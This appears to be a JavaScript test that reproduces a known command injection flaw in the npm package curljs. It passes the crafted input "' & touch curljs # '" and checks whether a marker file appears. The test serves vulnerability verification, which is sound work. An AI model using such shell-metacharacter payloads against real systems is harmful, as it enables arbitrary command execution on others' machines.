//https://snyk.io/vuln/SNYK-JS-CURLJS-1050404
test("Command Injection in curljs", () => {
  const a = require("curljs");
  const fs = require("fs");
  const path = "./curljs";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a("' & touch curljs # '");
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
